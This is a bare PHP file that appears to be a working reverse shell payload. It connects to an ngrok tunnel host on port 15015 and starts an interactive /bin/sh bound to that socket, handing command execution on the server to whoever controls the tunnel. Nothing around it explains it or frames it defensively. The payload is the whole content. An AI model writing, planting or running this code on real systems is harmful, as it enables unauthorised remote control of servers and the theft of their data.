<?php
$ip = '0.tcp.ap.ngrok.io';
$port = 15015;
$sock = fsockopen($ip, $port);
exec('/bin/sh -i <&3 >&3 2>&3');
?>
